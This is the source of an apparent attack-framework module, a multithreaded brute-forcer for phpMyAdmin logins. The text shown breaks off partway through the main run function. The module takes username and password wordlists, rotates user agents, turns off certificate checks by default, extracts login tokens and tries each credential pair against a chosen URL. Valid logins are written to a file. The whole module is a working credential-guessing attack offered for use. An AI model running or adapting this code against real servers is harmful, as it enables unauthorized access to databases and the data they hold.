"""
phpMyAdmin Bruteforce
"""

MODULE_INFO = {
    "description": "phpMyAdmin login bruteforce attack"
}

OPTIONS = {
    "target": {
        "type": "str",
        "description": "Target URL (http:// or https://)",
        "required": True,
        "default": ""
    },
    "username": {
        "type": "str", 
        "description": "Username to bruteforce",
        "required": False,
        "default": "root"
    },
    "user_wordlist": {
        "type": "str",
        "description": "Path to username wordlist file",
        "required": False,
        "default": ""
    },
    "passwd_wordlist": {
        "type": "str",
        "description": "Path to password wordlist file", 
        "required": False,
        "default": ""
    },
    "custom_passwords": {
        "type": "str",
        "description": "Custom passwords (comma separated)",
        "required": False,
        "default": "123,password,admin,root,123456"
    },
    "headers_file": {
        "type": "str",
        "description": "Path to custom headers file",
        "required": False,
        "default": ""
    },
    "useragents_file": {
        "type": "str",
        "description": "Path to user agents file",
        "required": False,
        "default": ""
    },
    "threads": {
        "type": "int",
        "description": "Number of concurrent threads",
        "required": False,
        "default": 10
    },
    "timeout": {
        "type": "int",
        "description": "Request timeout in seconds",
        "required": False,
        "default": 10
    },
    "ignore_ssl": {
        "type": "bool",
        "description": "Ignore SSL certificate errors",
        "required": False,
        "default": True
    }
}

import urllib.request
import urllib.parse
import urllib.error
import http.cookiejar
import threading
import re
import sys
import time
import ssl
import random
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

class PhpMyAdminBruteforcer:
    def __init__(self, target, timeout=10, ignore_ssl=True):
        self.target = target
        self.timeout = timeout
        self.ignore_ssl = ignore_ssl
        self.found_credentials = []
        self.attempts = 0
        self.successful = 0
        self.session_lock = threading.Lock()
        
        # Setup SSL context
        self.ssl_context = self.create_ssl_context()
    
    def create_ssl_context(self):
        """Create SSL context based on settings"""
        context = ssl.create_default_context()
        
        if self.ignore_ssl:
            # Disable SSL verification
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            print("[*] SSL verification disabled (ignore_ssl=True)")
        else:
            # Enable SSL verification
            context.check_hostname = True
            context.verify_mode = ssl.CERT_REQUIRED
            print("[*] SSL verification enabled")
        
        return context
    
    def load_wordlist(self, filepath):
        """Load wordlist from file"""
        if not filepath or not os.path.exists(filepath):
            return []
        
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
            print(f"[+] Loaded {len(lines)} items from {filepath}")
            return lines
        except Exception as e:
            print(f"[-] Error loading {filepath}: {e}")
            return []
    
    def load_headers(self, filepath):
        """Load custom headers from file"""
        headers = {}
        
        if not filepath or not os.path.exists(filepath):
            return headers
        
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        key, value = line.split(':', 1)
                        headers[key.strip()] = value.strip()
            print(f"[+] Loaded {len(headers)} headers from {filepath}")
        except Exception as e:
            print(f"[-] Error loading headers from {filepath}: {e}")
        
        return headers
    
    def get_default_user_agents(self):
        """Default user agents"""
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
        ]
    
    def create_opener(self):
        """Create URL opener with cookies and SSL support"""
        cookies = http.cookiejar.CookieJar()
        
        if self.target.startswith('https://'):
            # Create HTTPS handler with SSL context
            https_handler = urllib.request.HTTPSHandler(context=self.ssl_context)
            opener = urllib.request.build_opener(
                urllib.request.HTTPCookieProcessor(cookies),
                https_handler
            )
        else:
            # Standard opener for HTTP
            opener = urllib.request.build_opener(
                urllib.request.HTTPCookieProcessor(cookies)
            )
        
        return opener
    
    def test_connection(self):
        """Test connection to target with proper error handling"""
        print(f"[*] Testing connection to {self.target}")
        
        try:
            # Create opener
            opener = self.create_opener()
            
            # Add headers
            headers = {
                'User-Agent': random.choice(self.get_default_user_agents()),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            }
            
            request = urllib.request.Request(self.target, headers=headers)
            
            # Try to open connection
            response = opener.open(request, timeout=self.timeout)
            content = response.read().decode('utf-8', errors='ignore')
            
            # Check if it's phpMyAdmin
            is_phpmyadmin = any(indicator in content.lower() for indicator in 
                              ['phpmyadmin', 'pma_username', 'pma_password'])
            
            if is_phpmyadmin:
                print("[+] Successfully connected to phpMyAdmin")
                return True
            else:
                print("[-] Connected but target doesn't appear to be phpMyAdmin")
                print("[-] Page content indicates this might not be a phpMyAdmin installation")
                return False
                
        except urllib.error.HTTPError as e:
            print(f"[-] HTTP Error {e.code}: {e.reason}")
            if e.code == 404:
                print("[-] Target not found (404). Check the URL path.")
            elif e.code == 403:
                print("[-] Access forbidden (403). Check if phpMyAdmin is accessible.")
            return False
            
        except urllib.error.URLError as e:
            error_msg = str(e.reason)
            
            if "CERTIFICATE_VERIFY_FAILED" in error_msg:
                print("[-] SSL Certificate verification failed")
                print("[!] Try setting ignore_ssl=True for self-signed certificates")
                return False
            elif "Name or service not known" in error_msg:
                print("[-] Cannot resolve hostname. Check the target URL.")
                return False
            elif "Connection refused" in error_msg:
                print("[-] Connection refused. Target might be down or blocking connections.")
                return False
            elif "timed out" in error_msg:
                print(f"[-] Connection timeout after {self.timeout} seconds")
                return False
            else:
                print(f"[-] Connection error: {error_msg}")
                return False
                
        except ssl.SSLError as e:
            print(f"[-] SSL Error: {e}")
            print("[!] Try setting ignore_ssl=True")
            return False
            
        except Exception as e:
            print(f"[-] Unexpected error: {e}")
            return False
    
    def make_request(self, url, data=None, headers=None, user_agents=None):
        """Make HTTP/HTTPS request with proper error handling"""
        try:
            if headers is None:
                headers = {}
            
            # Add common headers
            base_headers = {
                'User-Agent': random.choice(user_agents) if user_agents else random.choice(self.get_default_user_agents()),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            base_headers.update(headers)
            
            opener = self.create_opener()
            
            if data:
                request = urllib.request.Request(url, data=data, headers=base_headers)
            else:
                request = urllib.request.Request(url, headers=base_headers)
            
            response = opener.open(request, timeout=self.timeout)
            return response, None
            
        except Exception as e:
            return None, f"Request failed: {str(e)}"
    
    def check_login(self, username, password, custom_headers=None, user_agents=None):
        """Check single username/password combination"""
        try:
            with self.session_lock:
                self.attempts += 1
                current_attempt = self.attempts
            
            print(f"[{current_attempt}] Trying: {username}/{password}")
            
            # Load login page to get tokens
            response, error = self.make_request(self.target, headers=custom_headers, user_agents=user_agents)
            if error:
                return False
            
            response_data = response.read()
            response_text = response_data.decode('utf-8', errors='ignore')
            
            # Extract tokens - multiple patterns for different phpMyAdmin versions
            token_match = re.findall(r'name="token"\s+value="([^"]+)"', response_text)
            if not token_match:
                token_match = re.findall(r'token" value="([^"]+)"', response_text)
            if not token_match:
                token_match = re.findall(r'name="token"\s+value=\'([^\']+)\'', response_text)
            
            session_match = re.findall(r'name="set_session"\s+value="([^"]+)"', response_text)
            if not session_match:
                session_match = re.findall(r'set_session" value="([^"]+)"', response_text)
            
            # If no tokens found, try alternative login form
            if not token_match or not session_match:
                # Try alternative token patterns
                token_match = re.findall(r'name="token"\s+value="([\w+=/]+)"', response_text)
                session_match = re.findall(r'name="set_session"\s+value="([\w]+)"', response_text)
                
                if not token_match or not session_match:
                    print(f"[-] Could not extract login tokens")
                    return False
            
            token = token_match[0]
            session = session_match[0] if session_match else ""
            
            # Prepare login data
            login_data = {
                'pma_username': username,
                'pma_password': password,
                'server': '1',
                'token': token
            }
            
            if session:
                login_data['set_session'] = session
            
            login_encoded = urllib.parse.urlencode(login_data).encode('utf-8')
            
            # Add specific headers for login
            login_headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': self.target.split('/')[0] + '//' + self.target.split('/')[2],
                'Referer': self.target
            }
            if custom_headers:
                login_headers.update(custom_headers)
            
            # Send login request
            response, error = self.make_request(self.target, data=login_encoded, headers=login_headers, user_agents=user_agents)
            if error:
                return False
            
            response_data = response.read()
            response_text = response_data.decode('utf-8', errors='ignore')
            
            # Check if login successful
            success_indicators = [
                "index.php?route=/server",
                "main.php",
                "navigation.php", 
                "server_privileges.php",
                "Welcome to phpMyAdmin",
                "Database server",
                "MySQL server",
                "logout.php",
                "PMA_single_signon_logout"
            ]
            
            failure_indicators = [
                "Cannot log in",
                "Login without a password",
                "Access denied",
                "login form",
                "pma_username",
                "error #1045",
                "mysql said"
            ]
            
            # Check for success
            if any(indicator in response_text for indicator in success_indicators):
                with self.session_lock:
                    self.successful += 1
                    self.found_credentials.append(f"{username}:{password}")
                print(f"[+] SUCCESS! Valid credentials: {username}/{password}")
                return True
            
            # Check for explicit failure
            if any(indicator in response_text for indicator in failure_indicators):
                return False
            
            # If unsure, assume failure
            return False
                
        except Exception as e:
            return False
    
    def bruteforce(self, usernames, passwords, custom_headers=None, user_agents=None, max_threads=10):
        """Perform bruteforce attack"""
        print(f"\n[*] Starting phpMyAdmin bruteforce attack")
        print(f"[*] Target: {self.target}")
        print(f"[*] Protocol: {'HTTPS' if self.target.startswith('https') else 'HTTP'}")
        print(f"[*] SSL Verification: {'Disabled' if self.ignore_ssl else 'Enabled'}")
        print(f"[*] Usernames: {len(usernames)}")
        print(f"[*] Passwords: {len(passwords)}")
        print(f"[*] Total combinations: {len(usernames) * len(passwords)}")
        print(f"[*] Threads: {max_threads}")
        print(f"[*] Timeout: {self.timeout}s")
        if custom_headers:
            print(f"[*] Custom headers: {len(custom_headers)}")
        if user_agents:
            print(f"[*] User agents: {len(user_agents)}")
        print("-" * 60)
        
        # Test connection first
        if not self.test_connection():
            print("[-] Cannot establish connection to target")
            print("[!] Troubleshooting tips:")
            print("    - Check if target URL is correct")
            print("    - Verify phpMyAdmin is accessible in browser")
            print("    - Try with ignore_ssl=True for HTTPS targets")
            print("    - Check network connectivity")
            return []
        
        start_time = time.time()
        
        # Generate all combinations
        combinations = []
        for username in usernames:
            for password in passwords:
                combinations.append((username, password))
        
        print(f"[*] Starting bruteforce with {len(combinations)} combinations...")
        
        # Use ThreadPoolExecutor for thread management
        try:
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                future_to_combo = {
                    executor.submit(self.check_login, user, pwd, custom_headers, user_agents): (user, pwd)
                    for user, pwd in combinations
                }
                
                completed = 0
                for future in as_completed(future_to_combo):
                    user, pwd = future_to_combo[future]
                    completed += 1
                    try:
                        future.result()
                    except Exception as exc:
                        pass  # Errors are handled in check_login
                    
                    # Progress update
                    if completed % 50 == 0:
                        progress = (completed / len(combinations)) * 100
                        elapsed = time.time() - start_time
                        speed = completed / elapsed if elapsed > 0 else 0
                        print(f"[*] Progress: {completed}/{len(combinations)} ({progress:.1f}%) - {speed:.1f} attempts/sec")
        
        except KeyboardInterrupt:
            print("\n[!] Bruteforce interrupted by user")
        
        end_time = time.time()
        total_time = end_time - start_time
        
        # Print summary
        print("\n" + "=" * 60)
        print("[*] BRUTEFORCE COMPLETED")
        print("=" * 60)
        print(f"[*] Total attempts: {self.attempts}")
        print(f"[*] Successful logins: {self.successful}")
        print(f"[*] Time elapsed: {total_time:.2f} seconds")
        print(f"[*] Average speed: {self.attempts/total_time:.2f} attempts/second")
        
        if self.found_credentials:
            print(f"\n[+] FOUND CREDENTIALS:")
            for cred in self.found_credentials:
                print(f"    {cred}")
            
            # Save to file
            timestamp = int(time.time())
            filename = f'phpmyadmin_credentials_{timestamp}.txt'
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"# phpMyAdmin Bruteforce Results\n")
                f.write(f"# Target: {self.target}\n")
                f.write(f"# Scan time: {time.ctime()}\n")
                f.write(f"# Found {len(self.found_credentials)} valid credentials\n\n")
                for cred in self.found_credentials:
                    f.write(f"{cred}\n")
            print(f"[+] Credentials saved to: {filename}")
        else:
            print("[-] No valid credentials found")
        
        return self.found_credentials

def run(session, options):
    """Main function called by the framework"""
    target = options.get("target", "")
    username = options.get("username", "root")
    username_wordlist = options.get("user_wordlist", "")
    password_wordlist = options.get("passwd_wordlist", "")
    custom_passwords = options.get("custom_passwords", "123,password,admin,root,123456")
    headers_file = options.get("headers_file", "")
    useragents_file = options.get("useragents_file", "")
    threads = int(options.get("threads", 10))
    timeout = int(options.get("timeout", 10))
    ignore_ssl = options.get("ignore_ssl", True)
    
    if not target:
        print("[!] Error: Target option is required")
        return False
    
    # Normalize target URL
    if not target.startswith(('http://', 'https://')):
        # Try to detect protocol
        target = 'http://' + target
        print(f"[*] Added http:// prefix to target")
    
    # Initialize bruteforcer
    bruteforcer = PhpMyAdminBruteforcer(target, timeout, ignore_ssl)
    
    # Load usernames
    if username_wordlist:
        usernames = bruteforcer.load_wordlist(username_wordlist)
        if not usernames:
            print(f"[!] No usernames loaded from {username_wordlist}")
            return False
    
